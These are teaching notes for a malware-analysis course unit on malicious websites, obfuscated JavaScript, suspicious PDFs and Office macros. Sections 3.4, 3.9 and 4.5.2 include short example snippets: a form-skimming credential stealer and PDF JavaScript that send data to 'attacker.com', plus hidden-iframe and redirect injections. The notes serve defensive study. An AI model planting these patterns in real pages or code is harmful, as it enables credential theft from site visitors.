# Unit 3: Malicious Web and Document Files

> **Course**: Reverse Engineering and Malware Analysis (REMA)
> **Unit**: 3 - Malicious Web and Document Files

---

## Table of Contents

1. [[#1. Introduction to Malicious Web Threats]]
2. [[#2. Interacting with Malicious Websites]]
3. [[#3. De-obfuscating Malicious JavaScript]]
4. [[#4. Analyzing Suspicious PDF Files]]
5. [[#5. Examining Malicious Microsoft Office Documents]]
6. [[#6. Analyzing Malicious RTF Document Files]]

---

## 1. Introduction to Malicious Web Threats

### 1.1 What is a Malicious Website?

> **Definition**: A **malicious website** is a web resource designed to cause harm to visitors by stealing sensitive data, injecting malware onto devices, or deceiving users into performing dangerous actions.

Unlike legitimate e-commerce stores, financial providers, or web applications that deliver services securely, malicious sites exist solely to:
- **Steal valuable data** (credentials, credit card numbers, personal information)
- **Inject malicious software** onto visitor devices
- **Deceive users** into making harmful decisions

#### Key Characteristic
The most dangerous aspect of malicious websites is their ability to **replicate familiar, reputable sites** with near-perfect accuracy. Amazon replicas, PayPal scams, and banking portals are commonly impersonated.

### 1.2 Types of Web-Based Attacks

#### 1.2.1 Formjacking

> **Definition**: **Formjacking** is a cyberattack technique where criminals inject malicious code into webpage forms (particularly payment pages) to compromise them and steal credit card details and other sensitive information entered by users.

**How it works:**
1. Attacker injects malicious JavaScript into a legitimate website's payment form
2. When users enter their credit card information, the malicious code captures it
3. Data is exfiltrated to attacker-controlled servers
4. The legitimate transaction may still complete, hiding the theft

**Real-world example**: The British Airways attack (2018) where attackers injected 22 lines of malicious JavaScript to steal payment data from approximately 380,000 transactions.

---

#### 1.2.2 Pharming

> **Definition**: **Pharming** is a technique used to redirect traffic from a legitimate website to a malicious one by modifying system settings or exploiting DNS server vulnerabilities.

**Key distinction from Typo-squatting**: Pharming can redirect users who **correctly type** the URL, unlike typo-squatting which relies on user mistakes.

**Attack Vectors:**

| Method | Description |
|--------|-------------|
| **DNS Poisoning** | Corrupting DNS cache to redirect domain queries |
| **Host File Modification** | Altering local hosts file to redirect specific domains |
| **Router Compromise** | Modifying router DNS settings to redirect all traffic |
| **Rogue DNS Server** | Setting up malicious DNS servers |

**Technical Process:**
```
User types: www.legitimatebank.com
    ↓
DNS Resolution (compromised)
    ↓
Returns malicious IP: 192.168.x.x (attacker's server)
    ↓
User lands on fake site (visually identical)
    ↓
Credentials harvested
```

---

#### 1.2.3 Typo-squatting (URL Hijacking)

> **Definition**: **Typo-squatting** is a technique where threat actors register domain names with similar spelling to legitimate domains, exploiting common typing errors to redirect users to malicious sites.

**Common Techniques:**
- **Character substitution**: `amaz0n.com` (zero instead of 'o')
- **Missing characters**: `amazn.com`
- **Additional characters**: `amazone.com`
- **Adjacent key errors**: `amazom.com` ('m' near 'n')
- **Homograph attacks**: Using Unicode characters that look similar (`аmazon.com` using Cyrillic 'а')

**Example Matrix:**

| Legitimate Domain | Typo-squatted Variants |
|-------------------|------------------------|
| `amazon.com` | `amaz0n.com`, `amazn.com`, `aamazon.com` |
| `paypal.com` | `paypa1.com`, `paypai.com`, `papal.com` |
| `google.com` | `gogle.com`, `goggle.com`, `g00gle.com` |

---

#### 1.2.4 Watering Hole Attack

> **Definition**: A **watering hole attack** is a targeted attack that compromises websites frequently visited by a specific industry or user group, using them to deliver malware and gain access to organizational networks.

**Attack Flow:**
```
1. Reconnaissance
   └── Identify target organization/industry
   └── Determine commonly visited websites

2. Compromise
   └── Exploit vulnerabilities in trusted sites
   └── Inject malicious code

3. Wait
   └── Monitor for target visitors
   └── Fingerprint visitors (browser, OS, plugins)

4. Exploit
   └── Deliver tailored malware
   └── Establish persistence in target network
```

**Why it's effective:**
- Targets trust the compromised website
- Security tools may whitelist frequently visited sites
- Attack is passive (waits for victims to come)

---

#### 1.2.5 Hybrid Attacks

> **Definition**: **Hybrid attacks** combine multiple techniques, such as hijacking legitimate sites and implanting malicious redirects while maintaining normal functionality.

**Types of Hybrid Attacks:**
- **Cross-Site Scripting (XSS)**: Injecting malicious scripts into trusted websites
- **SQL Injection**: Exploiting database vulnerabilities to modify site content
- **Malicious Redirects**: Funneling visitors to attacker-controlled content

---

### 1.3 Real-World Examples of Malicious Websites

#### Case Study: BAHAMUT Phishing Network

BAHAMUT represents a sophisticated threat actor that operates fake news websites by:
- Taking over defunct news sites (e.g., Techsprouts)
- Creating complex networks of fake contributors and social media accounts
- Using zero-day exploits to deliver malware
- Targeting high-value individuals in South Asia and the Middle East

**Attack Methodology:**
1. Send tailored, informative emails or social media posts
2. Victims follow links to seemingly legitimate articles
3. Zero-day exploits deliver malware silently
4. Long-term access established for espionage

#### Common Impersonation Targets

| Platform | Attack Method |
|----------|---------------|
| **PayPal** | Fake "account limited" notifications requesting verification |
| **Amazon** | Prime Day scams, fake video streaming solutions |
| **eBay** | Credit card update requests, fake member messages |
| **Government Tax Services** | Fake COVID-19 refunds, tax filing scams |

---

### 1.4 How Malicious Websites Work

#### 1.4.1 Phishing Sites

**Purpose**: Tempt visitors to enter sensitive information through:
- Standard online forms
- Document requests
- Mailing list sign-ups
- Fake login portals

**Targeted Data:**
- Credit card numbers
- Login credentials
- Home addresses
- Social Security numbers
- Banking information

#### 1.4.2 Malware Distribution Sites

**Three Primary Methods:**

##### A. Drive-By Downloads

> **Definition**: **Drive-by downloads** deliver malicious code to devices without any user interaction or awareness. No download prompt appears, and the infection happens silently.

**Technical Mechanism:**
```javascript
// Example: Corrupted JavaScript injection point
// (Educational example - shows attack pattern)
<script>
    // Fingerprint browser
    var ua = navigator.userAgent;
    // Check for vulnerable version
    if (isVulnerable(ua)) {
        // Trigger exploit without user interaction
        loadExploit();
    }
</script>
```

**Delivery vectors:**
- Corrupted JavaScript files
- Malicious browser plugins
- Compromised advertising networks
- Exploit kits (Angler, RIG, Magnitude)

##### B. Malicious File Downloads

Common disguises for malware:
- Antivirus software
- Media players
- Video codecs
- System utilities
- Game cracks/keygens

##### C. Malvertising

> **Definition**: **Malvertising** uses corrupted pop-up advertisements to distribute malware. These ads may appear in legitimate advertising networks and look normal until clicked.

**Infection Flow:**
```
Legitimate advertising network
         ↓
Malicious ad submitted (bypasses review)
         ↓
Ad displayed on reputable website
         ↓
User clicks ad (or sometimes just views)
         ↓
Redirect to exploit kit / malware download
```

---

### 1.5 Identifying Malicious Websites

#### Red Flags Checklist

| Indicator | Description |
|-----------|-------------|
| **HTTP instead of HTTPS** | Missing SSL/TLS encryption (no padlock icon) |
| **Misspellings/Grammar errors** | Unprofessional content quality |
| **Suspicious download prompts** | Unexpected requests to install software |
| **Fake prizes/warnings** | "You've won!" or "Your system is infected!" |
| **Incorrect domain names** | Slight variations from legitimate URLs |
| **Missing contact information** | No verifiable business details |
| **Overly generous deals** | Offers too good to be true |

#### URL Analysis Technique

```
Legitimate: https://www.amazon.com/dp/B08N5WRWNW
Suspicious:  http://www.amazon1.com/dp/B08N5WRWNW
                    ↑            ↑
                  No HTTPS   Extra character

Check for:
1. Protocol (HTTPS vs HTTP)
2. Domain spelling
3. Subdomain manipulation (paypal.malicious.com)
4. URL shorteners hiding destinations
```

---

### 1.6 Consequences of Visiting Malicious Sites

| Threat | Description | Impact |
|--------|-------------|--------|
| **Security Weaknesses** | Drive-by downloads exploit vulnerabilities | Corporate data breaches |
| **Malicious Code Damage** | JavaScript infections cascade through systems | File corruption, system collapse |
| **Malvertising Spread** | Clicking propagates malicious ads | Wider infection network |
| **Browser Hijacking** | URL injection takes control of browser | Spyware, ransomware installation |
| **Data Loss** | Phishing harvests confidential information | Average cost: $14.8 million/year per company |

---

### 1.7 Protection Strategies

#### Technical Controls

```
┌─────────────────────────────────────────────────────────┐
│                DEFENSE IN DEPTH MODEL                    │
├─────────────────────────────────────────────────────────┤
│  Layer 1: Network Security                               │
│  ├── Firewalls with URL filtering                       │
│  ├── DNS filtering services                              │
│  └── Network segmentation                                │
├─────────────────────────────────────────────────────────┤
│  Layer 2: Endpoint Security                              │
│  ├── Updated antivirus/anti-malware                     │
│  ├── Regular OS patching                                 │
│  └── Browser security settings                           │
├─────────────────────────────────────────────────────────┤
│  Layer 3: User Awareness                                 │
│  ├── Security training programs                          │
│  ├── Phishing simulation exercises                       │
│  └── Clear security policies                             │
└─────────────────────────────────────────────────────────┘
```

#### Best Practices

1. **Patch Management**: Regular updates for OS, browsers, and applications
2. **Email Security**: Avoid unsolicited attachments; verify sender legitimacy
3. **URL Verification**: Check links before clicking; hover to preview
4. **Network Segmentation**: Separate work resources from general browsing
5. **User Activity Monitoring**: Track and limit access to risky websites

---

## 2. Interacting with Malicious Websites

### 2.1 Setting Up a Safe Analysis Environment

> **Critical Warning**: Never analyze malicious websites on a production system or personal device. Always use isolated environments.

#### Recommended Setup

```
┌─────────────────────────────────────────────────────────┐
│              MALWARE ANALYSIS LAB SETUP                  │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌─────────────────┐     ┌──────────────────────┐       │
│  │   Host Machine   │     │   Virtual Machine    │       │
│  │   (Air-gapped)   │────▶│   (Snapshot-ready)   │       │
│  └─────────────────┘     └──────────────────────┘       │
│                                │                         │
│                                ▼                         │
│                        ┌──────────────────┐             │
│                        │  Isolated Browser │             │
│                        │  (No extensions)  │             │
│                        └──────────────────┘             │
│                                                          │
│  Network: Air-gapped or monitored proxy                 │
│  Snapshots: Taken before each analysis                  │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### Virtual Machine Configuration

| Setting | Recommended Value |
|---------|-------------------|
| **RAM** | 4-8 GB |
| **Storage** | 50+ GB (SSD preferred) |
| **Network** | Host-only or NAT with monitoring |
| **Snapshots** | Clean state before each analysis |
| **Guest Additions** | Minimal or disabled |
| **Shared Folders** | Disabled |

#### Recommended Analysis Tools

| Category | Tools |
|----------|-------|
| **Virtual Machines** | VirtualBox, VMware Workstation, QEMU |
| **Browser Isolation** | Browserling, ANY.RUN, urlscan.io |
| **Traffic Analysis** | Wireshark, Fiddler, Burp Suite |
| **Screenshot Services** | urlscan.io, Screenshot Machine |
| **URL Scanners** | VirusTotal, URLhaus, PhishTank |

### 2.2 Reconnaissance Techniques

#### Passive Analysis (Recommended First Step)

```bash
# WHOIS lookup for domain information
whois suspicious-domain.com

# DNS records analysis
dig suspicious-domain.com ANY
nslookup -type=ANY suspicious-domain.com

# Check domain reputation
# VirusTotal, AbuseIPDB, URLhaus

# Historical data
# Wayback Machine, SecurityTrails
```

#### Active Analysis (In Isolated Environment)

1. **Network Traffic Monitoring**
   - Capture all HTTP/HTTPS requests
   - Document external resource loading
   - Track redirects and iframes

2. **DOM Inspection**
   - Analyze JavaScript inclusion
   - Check for obfuscated code
   - Document form actions and data destinations

3. **Behavioral Analysis**
   - Monitor file system changes
   - Track registry modifications (Windows)
   - Log process creation events

### 2.3 Threat Assessment Methodology

```
┌─────────────────────────────────────────────────────────┐
│           MALICIOUS WEBSITE ASSESSMENT FLOW             │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. INITIAL TRIAGE                                       │
│     ├── URL reputation check                            │
│     ├── WHOIS/DNS analysis                              │
│     └── Historical lookup                                │
│                          ↓                               │
│  2. PASSIVE ANALYSIS                                     │
│     ├── Screenshot services                             │
│     ├── Source code retrieval (curl/wget)              │
│     └── Third-party scan results                        │
│                          ↓                               │
│  3. ACTIVE ANALYSIS (VM Required)                       │
│     ├── Live browser interaction                        │
│     ├── Network traffic capture                         │
│     └── JavaScript execution monitoring                 │
│                          ↓                               │
│  4. DOCUMENTATION                                        │
│     ├── IOCs (URLs, IPs, hashes)                       │
│     ├── Behavioral indicators                           │
│     └── Attack classification                           │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

## 3. De-obfuscating Malicious JavaScript

### 3.1 Understanding JavaScript in the Context of Security

> **Definition**: **JavaScript** is a core web programming language used by approximately 93.6% of websites, enabling interactive and dynamic content delivery.

**File Extension**: `.js`

**Important Distinction**: JavaScript is **different from Java** - they are separate programming languages with different purposes and syntax.

### 3.2 Why Attackers Target JavaScript

| Reason | Explanation |
|--------|-------------|
| **Widespread Usage** | Present on nearly all websites |
| **Client-Side Execution** | Runs in victim's browser |
| **Easy Injection** | Multiple vectors for code insertion |
| **Large Attack Surface** | Millions of potential victims |
| **Low Cost** | Minimal resources required for attacks |
| **Difficult Detection** | Obfuscation hides malicious intent |

### 3.3 Types of JavaScript-Based Malware

```
┌─────────────────────────────────────────────────────────┐
│           JAVASCRIPT MALWARE CATEGORIES                  │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌─────────────────┐  ┌─────────────────┐               │
│  │   RANSOMWARE    │  │   FINANCIAL     │               │
│  │  (Ransom32,RAA) │  │    MALWARE      │               │
│  └─────────────────┘  └─────────────────┘               │
│                                                          │
│  ┌─────────────────┐  ┌─────────────────┐               │
│  │    BOTNET       │  │  DATA STEALING  │               │
│  │    MALWARE      │  │    MALWARE      │               │
│  └─────────────────┘  └─────────────────┘               │
│                                                          │
│  ┌─────────────────┐  ┌─────────────────┐               │
│  │  CRYPTOMINERS   │  │   KEYLOGGERS    │               │
│  └─────────────────┘  └─────────────────┘               │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 3.4 JavaScript Attack Vectors

#### 3.4.1 Code Injection in Legitimate Websites

Malicious code is injected to redirect users or exploit servers:

```javascript
// Example of injected redirect (Educational)
document.location = "http://malicious-site.com/exploit";

// Hidden iframe injection
var iframe = document.createElement('iframe');
iframe.src = "http://malicious-site.com/payload";
iframe.style.display = 'none';
document.body.appendChild(iframe);
```

#### 3.4.2 Hidden iFrames

```html
<!-- Malicious iframe loading exploit kit -->
<iframe src="http://exploit-kit.com/landing"
        width="0" height="0"
        style="visibility:hidden">
</iframe>
```

#### 3.4.3 Malvertising Injection

Malicious code appears in advertising networks:
- Silently redirects users
- Exploits browser vulnerabilities
- Delivers payloads without interaction

#### 3.4.4 Drive-By Downloads

JavaScript exploits trigger malware downloads:
- No user interaction required
- Exploits browser/plugin vulnerabilities
- Often delivers Exploit Kits (Angler, RIG)

#### 3.4.5 Malicious Attachments

JavaScript files (`.js`, `.jse`) executed through Windows Script Host:
- Can access file system
- Execute system commands
- Download additional payloads

#### 3.4.6 Compromised Browser Extensions

Extensions can:
- Load external malicious content
- Intercept form data
- Modify page content
- Steal credentials

### 3.5 Red Flags in JavaScript Analysis

> **Key Indicators of Malicious JavaScript**

| Red Flag | Description |
|----------|-------------|
| **Heavy Obfuscation** | Multiple layers of encoding/encryption |
| **Meaningless Variable Names** | `var a1b2c3 = "..."` randomly generated |
| **eval() Usage** | Dynamic code execution |
| **Function() Constructor** | Creates functions from strings |
| **setTimeout/setInterval with strings** | Delayed code execution |
| **Base64 Decoding (atob())** | Hidden payload decoding |
| **String Manipulation** | Splitting, reversing, XOR operations |
| **DOM Manipulation** | Creating scripts/iframes dynamically |
| **External URL Loading** | Fetching resources from suspicious domains |
| **Cookie/Storage Access** | Reading session tokens, credentials |
| **Clipboard Access** | Stealing copied content |
| **Form Capture** | Intercepting form submissions |

### 3.6 JavaScript Analysis Methodology

#### Step 1: Identify the Entry Point

Determine where the script originates:

```
┌─────────────────────────────────────────────────────────┐
│              JAVASCRIPT ENTRY POINTS                     │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. Inline script in HTML                               │
│     <script>malicious code here</script>                │
│                                                          │
│  2. External .js file                                    │
│     <script src="malicious.js"></script>                │
│                                                          │
│  3. Third-party/CDN injection                           │
│     Compromised library or CDN resource                  │
│                                                          │
│  4. Malicious advertisement                              │
│     Loaded through ad network                            │
│                                                          │
│  5. Phishing page script                                 │
│     Credential harvesting forms                          │
│                                                          │
│  6. Embedded in documents                                │
│     PDF, email attachments, HTML files                   │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### Step 2: Static Analysis

Analyze code without execution:

```javascript
// Focus areas for static analysis:

// 1. Suspicious function calls
eval(decodedString);           // Dynamic execution
document.write(payload);        // DOM manipulation
innerHTML = userInput;          // Potential XSS
fetch(externalURL);            // External communication
XMLHttpRequest();              // Network requests
WebSocket();                   // Persistent connections

// 2. Encoded payloads
atob("SGVsbG8gV29ybGQ=");      // Base64 decoding
String.fromCharCode(72,101);   // Character code conversion
unescape("%48%65%6C%6C%6F");   // URL decoding

// 3. Environment detection
navigator.userAgent;           // Browser fingerprinting
screen.width;                  // Screen detection
navigator.plugins;             // Plugin enumeration

// 4. Credential harvesting
document.forms[0];             // Form access
document.cookie;               // Cookie theft
localStorage.getItem();        // Storage access
```

#### Step 3: Dynamic Analysis

> **Warning**: Only perform in isolated VM environment!

**Requirements:**
- Isolated VM with snapshots
- No personal accounts logged in
- Monitored/restricted network
- Process monitoring enabled

**What to observe:**
- URLs contacted
- Files downloaded/dropped
- Cookies/keystrokes captured
- Redirections triggered
- Fake login overlays

#### Step 4: Behavior Mapping

Map observed behavior to attack goals:

| Behavior | Attack Goal |
|----------|-------------|
| Form interception | Credential theft |
| URL redirection | Phishing/exploit delivery |
| Browser exploitation | System compromise |
| Script downloads | Additional payload delivery |
| Ad injection | Revenue generation |
| Crypto-mining code | Resource hijacking |
| LocalStorage persistence | Maintaining access |

### 3.7 Common Obfuscation Techniques

#### 3.7.1 String Encoding

```javascript
// Base64 Encoding
var payload = atob("ZXZhbCgiYWxlcnQoMSkiKQ==");
// Decodes to: eval("alert(1)")

// Character Code Construction
var str = String.fromCharCode(101,118,97,108);
// Builds: "eval"

// Hexadecimal Encoding
var hex = "\x65\x76\x61\x6c";
// Decodes to: "eval"
```

#### 3.7.2 String Manipulation

```javascript
// String Reversal
var cmd = "tpircSavaJ".split("").reverse().join("");
// Result: "JavaScript"

// String Splitting
var a = "ev"; var b = "al";
window[a+b](code);
// Calls: eval(code)

// Array-based reconstruction
var arr = ["e","v","a","l"];
window[arr.join("")](code);
```

#### 3.7.3 Variable Name Obfuscation

```javascript
// Meaningless names
var _0x4a3b = function(_0x2c1f, _0x3d4e) {
    return _0x2c1f + _0x3d4e;
};

// Unicode variable names
var \u0065\u0076\u0061\u006c = window["eval"];
```

#### 3.7.4 Control Flow Obfuscation

```javascript
// Dead code insertion
if (false) { /* never executes */ }

// Opaque predicates
var x = Math.random() < 2; // Always true
if (x) { maliciousCode(); }

// Switch statement flattening
var state = 0;
while (true) {
    switch(state) {
        case 0: step1(); state = 3; break;
        case 3: step2(); state = 1; break;
        case 1: step3(); return;
    }
}
```

### 3.8 De-obfuscation Techniques

#### Using Browser Developer Tools

```
1. Open Developer Tools (F12)
2. Navigate to Sources/Debugger tab
3. Set breakpoints at suspicious functions:
   - eval()
   - document.write()
   - Function()
4. Step through execution
5. Inspect variable values at each step
6. Use Console to evaluate expressions
```

#### Using Online Tools

| Tool | Purpose |
|------|---------|
| **JS Beautifier** | Format minified code |
| **de4js** | Unpack/decode JavaScript |
| **JStillery** | Advanced deobfuscation |
| **Malzilla** | Malware analysis tool |

#### Manual De-obfuscation Process

```javascript
// Original obfuscated code
var _0x3c2f = ['log','Hello'];
console[_0x3c2f[0]](_0x3c2f[1]);

// Step 1: Identify array references
// _0x3c2f[0] = 'log'
// _0x3c2f[1] = 'Hello'

// Step 2: Substitute values
console['log']('Hello');

// Step 3: Simplify
console.log('Hello');
```

### 3.9 Common Malicious JavaScript Patterns

#### Credential Stealer Pattern

```javascript
// Educational example showing attack pattern
document.forms[0].onsubmit = function() {
    var username = document.getElementById('user').value;
    var password = document.getElementById('pass').value;

    // Exfiltrate to attacker server
    new Image().src = "http://attacker.com/steal?" +
                      "u=" + username +
                      "&p=" + password;

    return true; // Allow form to submit normally
};
```

#### Redirect Chain Pattern

```javascript
// Multi-stage redirect
function redirect() {
    var gates = [
        "http://gate1.com/check",
        "http://gate2.com/verify",
        "http://final.com/payload"
    ];
    // Navigate through gates
    window.location = gates[currentStage];
}
```

### 3.10 Protection Against JavaScript Malware

```
┌─────────────────────────────────────────────────────────┐
│            JAVASCRIPT SECURITY LAYERS                    │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Browser Level                                           │
│  ├── Keep browser updated                               │
│  ├── Use script blockers (NoScript, uBlock)            │
│  ├── Enable click-to-play for plugins                   │
│  └── Disable unnecessary features                        │
│                                                          │
│  Network Level                                           │
│  ├── Web filtering/proxy                                │
│  ├── DNS filtering                                       │
│  └── SSL/TLS inspection                                  │
│                                                          │
│  Endpoint Level                                          │
│  ├── Antivirus with web protection                      │
│  ├── Application whitelisting                           │
│  └── Regular patching                                    │
│                                                          │
│  User Awareness                                          │
│  ├── Recognize suspicious sites                         │
│  ├── Don't click unknown links                          │
│  └── Report suspicious activity                          │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

## 4. Analyzing Suspicious PDF Files

### 4.1 Understanding PDF Format

> **Definition**: **Portable Document Format (PDF)** was created by Adobe in 1993 as a cross-platform file format supporting text, images, links, and maintaining consistent appearance across different devices and software.

### 4.2 PDF File Structure

A PDF file consists of four main sections:

```
┌─────────────────────────────────────────────────────────┐
│                  PDF FILE STRUCTURE                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌─────────────────────────────────────────────────┐    │
│  │  1. HEADER                                       │    │
│  │     %PDF-1.7 (Version information)              │    │
│  └─────────────────────────────────────────────────┘    │
│                          ↓                               │
│  ┌─────────────────────────────────────────────────┐    │
│  │  2. BODY                                         │    │
│  │     Objects containing document content:        │    │
│  │     - Text, Images, Links                       │    │
│  │     - JavaScript, Embedded files               │    │
│  └─────────────────────────────────────────────────┘    │
│                          ↓                               │
│  ┌─────────────────────────────────────────────────┐    │
│  │  3. CROSS-REFERENCE TABLE (xref)                │    │
│  │     Byte offsets to each object                 │    │
│  └─────────────────────────────────────────────────┘    │
│                          ↓                               │
│  ┌─────────────────────────────────────────────────┐    │
│  │  4. TRAILER                                      │    │
│  │     Pointers to xref and root object            │    │
│  └─────────────────────────────────────────────────┘    │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 4.3 PDF Object Types

| Object Type | Syntax | Description |
|-------------|--------|-------------|
| **Names** | `/Name` | Unique identifiers (backslash + ASCII) |
| **Strings** | `(text)` | Text enclosed in parentheses |
| **Arrays** | `[1 2 3]` | Ordered collections in square brackets |
| **Dictionaries** | `<< /Key /Value >>` | Key-value pairs in double angle brackets |
| **Streams** | `stream...endstream` | Binary data (images, compressed content) |
| **Indirect Objects** | `1 0 obj...endobj` | Numbered objects that can be referenced |

#### Object Reference Example

```
% Object definition
3 0 obj
<< /Type /Page
   /Contents 5 0 R    % Reference to object 5
>>
endobj

% Reference syntax: ObjectNumber GenerationNumber R
% 5 0 R means "object 5, generation 0"
```

### 4.4 Security Risks in PDF Files

> **Fact**: PDFs are the most common malicious file type in phishing emails.

#### Why PDFs Are Dangerous

1. **JavaScript Support**: PDFs can contain executable JavaScript
2. **Embedded Files**: Can hide executables within the document
3. **Compressed Streams**: Malicious content hidden in encoded streams
4. **Reader Vulnerabilities**: Exploits targeting PDF reader software
5. **Trusted Format**: Users generally trust PDF files

### 4.5 Common PDF Attack Methods

#### 4.5.1 Malicious Links

```
┌─────────────────────────────────────────────────────────┐
│                                                          │
│    ┌──────────────────────────────┐                     │
│    │   "Click here to verify     │                     │
│    │    your account"            │ ← Looks like button │
│    └──────────────────────────────┘                     │
│                   │                                      │
│                   ▼                                      │
│    Actual link: http://phishing-site.com/steal         │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

Links can be:
- Disguised as buttons or images
- Hidden behind legitimate-looking text
- Redirecting to phishing pages
- Triggering exploit kit landing pages

#### 4.5.2 Embedded JavaScript

```javascript
// Example of malicious PDF JavaScript (Educational)
// Triggered when PDF opens

this.submitForm({
    cURL: "http://attacker.com/collect",
    cSubmitAs: "PDF"
});

// Or exploiting vulnerabilities
app.launchURL("http://exploit-kit.com/payload");
```

#### 4.5.3 Compressed Streams

Malicious content hidden using filters:
- FlateDecode (zlib compression)
- ASCIIHexDecode
- ASCII85Decode
- LZWDecode
- Multiple chained filters

```
stream
% Compressed/encoded malicious content
% Must be decompressed to analyze
endstream
```

#### 4.5.4 Embedded File Exploits

PDFs can embed entire files:
- Executables (.exe, .dll)
- JavaScript files (.js)
- Other documents with macros

### 4.6 Signs of Malicious PDFs

| Indicator | Significance |
|-----------|--------------|
| **JavaScript presence** | Potential code execution |
| **/OpenAction** | Auto-execute on open |
| **/AA (Additional Actions)** | Event-triggered actions |
| **/Launch** | Can execute external programs |
| **/EmbeddedFile** | Hidden file attachments |
| **Multiple encoded streams** | Obfuscation attempt |
| **/URI to suspicious domains** | Phishing links |
| **Unusual file size** | Hidden content |
| **/JS or /JavaScript** | Script inclusion |

### 4.7 PDF Analysis Tools

#### Command-Line Tools

| Tool | Description |
|------|-------------|
| **pdfid.py** | Quick identification of suspicious elements |
| **pdf-parser.py** | Detailed object extraction and analysis |
| **peepdf** | Interactive Python shell for PDF analysis |
| **pdftotext** | Extract text content |
| **qpdf** | Transform and inspect PDF structure |

#### Usage Examples

```bash
# Identify suspicious elements
python pdfid.py suspicious.pdf

# Output shows counts of:
# /JS       : 1    (JavaScript present!)
# /OpenAction: 1   (Auto-execute action!)
# /Launch   : 0
# /EmbeddedFile: 1 (Embedded content!)

# Parse specific object
python pdf-parser.py --object 5 suspicious.pdf

# Extract streams
python pdf-parser.py --filter suspicious.pdf

# Interactive analysis with peepdf
peepdf -i suspicious.pdf
PPDF> info
PPDF> object 5
PPDF> stream 5
```

### 4.8 PDF Analysis Methodology

```
┌─────────────────────────────────────────────────────────┐
│              PDF ANALYSIS WORKFLOW                       │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. INITIAL TRIAGE                                       │
│     ├── Check file type (file command)                  │
│     ├── Calculate hashes (MD5, SHA256)                  │
│     └── VirusTotal lookup                               │
│                          ↓                               │
│  2. STRUCTURE ANALYSIS                                   │
│     ├── Run pdfid.py for quick scan                     │
│     ├── Identify suspicious keywords                    │
│     └── Note object counts and versions                 │
│                          ↓                               │
│  3. OBJECT EXAMINATION                                   │
│     ├── Extract and examine each object                 │
│     ├── Decode compressed streams                       │
│     └── Look for JavaScript or embedded files          │
│                          ↓                               │
│  4. CODE ANALYSIS                                        │
│     ├── Extract JavaScript code                         │
│     ├── De-obfuscate if necessary                       │
│     └── Identify malicious functionality               │
│                          ↓                               │
│  5. BEHAVIORAL ANALYSIS (VM)                            │
│     ├── Open in isolated environment                    │
│     ├── Monitor network connections                     │
│     └── Track file system changes                       │
│                          ↓                               │
│  6. DOCUMENTATION                                        │
│     ├── Document IOCs                                   │
│     ├── Write analysis report                           │
│     └── Share findings                                   │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 4.9 Real Attack Example: Fake Amazon Login

**Attack Flow:**
1. Victim receives email with PDF attachment
2. PDF appears as Amazon login request
3. Contains hidden malicious JavaScript
4. JavaScript redirects to fake login page
5. Credentials harvested by attacker

**Indicators:**
- Unexpected Amazon communication
- Request for login via PDF (unusual)
- Urgency language ("verify immediately")
- External links in document

### 4.10 PDF Security Best Practices

| Practice | Implementation |
|----------|----------------|
| **Keep readers updated** | Enable automatic updates |
| **Disable JavaScript** | Settings → JavaScript → Uncheck "Enable" |
| **Protected View** | Enable for files from untrusted sources |
| **Don't click links** | Manually type URLs instead |
| **Verify sender** | Confirm PDF source before opening |
| **Use scanning tools** | Analyze suspicious PDFs before opening |
| **Sandbox execution** | Open untrusted PDFs in isolated environment |

---

## 5. Examining Malicious Microsoft Office Documents

### 5.1 Understanding Office Document Risks

Microsoft Office documents (Word, Excel, PowerPoint) are common malware delivery vectors because:

- **Ubiquitous usage** in business environments
- **Macro support** allows code execution
- **Trusted format** that users open without suspicion
- **Multiple file formats** with varying security
- **Rich functionality** provides attack surface

### 5.2 Office File Formats

#### Legacy Formats (OLE-based)

| Extension | Application | Description |
|-----------|-------------|-------------|
| `.doc` | Word | OLE Compound Document |
| `.xls` | Excel | OLE Compound Document |
| `.ppt` | PowerPoint | OLE Compound Document |

#### Modern Formats (OOXML-based)

| Extension | Application | Description |
|-----------|-------------|-------------|
| `.docx` | Word | ZIP archive with XML |
| `.xlsx` | Excel | ZIP archive with XML |
| `.pptx` | PowerPoint | ZIP archive with XML |

#### Macro-Enabled Formats

| Extension | Description |
|-----------|-------------|
| `.docm` | Word with macros |
| `.xlsm` | Excel with macros |
| `.pptm` | PowerPoint with macros |
| `.xlsb` | Excel binary with macros |

### 5.3 Understanding VBA Macros

> **Definition**: **Visual Basic for Applications (VBA)** is a programming language embedded in Microsoft Office that allows automation of tasks and creation of custom functions.

#### Legitimate Uses
- Automating repetitive tasks
- Creating custom forms
- Data processing in Excel
- Document generation

#### Malicious Uses
- Downloading additional malware
- Executing system commands
- Establishing persistence
- Data exfiltration
- Ransomware deployment

### 5.4 How Macro Malware Works

```
┌─────────────────────────────────────────────────────────┐
│              MACRO MALWARE INFECTION CHAIN               │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. DELIVERY                                             │
│     └── Email attachment, download link                 │
│                          ↓                               │
│  2. SOCIAL ENGINEERING                                   │
│     └── "Enable Editing" / "Enable Content"             │
│                          ↓                               │
│  3. MACRO EXECUTION                                      │
│     └── Auto_Open, Document_Open, or Workbook_Open     │
│                          ↓                               │
│  4. PAYLOAD DELIVERY                                     │
│     ├── PowerShell download cradle                      │
│     ├── WScript/CScript execution                       │
│     └── Direct shellcode execution                      │
│                          ↓                               │
│  5. MALWARE INSTALLATION                                 │
│     ├── Additional malware downloaded                   │
│     ├── Persistence established                         │
│     └── C2 communication initiated                      │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 5.5 Common Macro Triggers

| Trigger | Description |
|---------|-------------|
| `Auto_Open()` | Runs when document opens |
| `Document_Open()` | Runs when Word document opens |
| `Workbook_Open()` | Runs when Excel workbook opens |
| `Auto_Close()` | Runs when document closes |
| `Document_Close()` | Runs when Word document closes |
